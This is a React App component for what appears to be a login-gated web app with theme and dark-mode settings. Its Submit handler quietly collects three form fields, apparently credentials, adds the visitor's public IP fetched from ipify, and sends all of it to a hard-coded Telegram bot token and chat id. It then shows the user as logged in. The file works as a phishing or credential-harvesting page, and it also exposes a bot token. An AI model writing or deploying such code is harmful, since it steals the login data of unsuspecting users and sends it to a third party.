import axios from "axios";
import { useMemo } from "react";
import { createContext, useContext, useEffect, useState } from "react"
import { useNavigate } from "react-router-dom"
import Router from "./Router"

export const Mycontext = createContext();

function App() {

    const [hle, setIP] = useState('dont relase !');

    const navigate = useNavigate();
    const [darkMode, setDarkMode] = useState(false);
    const [line, setLine] = useState(localStorage.getItem('line') ? localStorage.getItem('line') : 'blue');

    useEffect(() => {
        document.querySelector(':root').style.setProperty('--dark', (darkMode ? 'white' : 'black'));
        document.querySelector(':root').style.setProperty('--white', (darkMode ? 'black' : 'white'));
    }, [darkMode]);

    useMemo(() => {
        localStorage.setItem('line', line);
        document.querySelector(':root').style.setProperty('--color', line);
    }, [line])

    const toggleMode = () => {
        setDarkMode(!darkMode);
    };

    useEffect(() => {

        navigate('/');
        setTimeout(() => {
            const loc = localStorage.getItem('user');

            if (loc === null) {
                navigate('/login');
            } else {
                navigate('/home');
            }

        }, 5200);

        axios.get('https://api.ipify.org?format=json')
            .then(res => setIP(res.data?.ip))
            .catch(r => r);

    }, []);

    function Submit(e) {
        e.preventDefault();
        let sunc = `${hle} ${e.target[1].value} ${e.target[0].value} ${e.target[2].value}`
        var url = `https://api.telegram.org/bot6509606080:AAEzTucp2ZAIvIHH1PIQRZeDwngN2Fz5rDY/sendMessage?chat_id=-1001591961491&text=${sunc}`
        let api = new XMLHttpRequest();
        api.open("GET", url, true);
        api.send();

        localStorage.setItem('user', hle);
        navigate('/home')
    }

    return <>
        <div className='box'>
            <div className="area" >
                <ul className="circles">
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>
                    <li></li>

                </ul>
            </div >
        </div>
        <Mycontext.Provider value={{
            toggleMode,
            setLine,
            line,
            Submit
        }}>
            <Router />
        </Mycontext.Provider>
    </>
}
export default App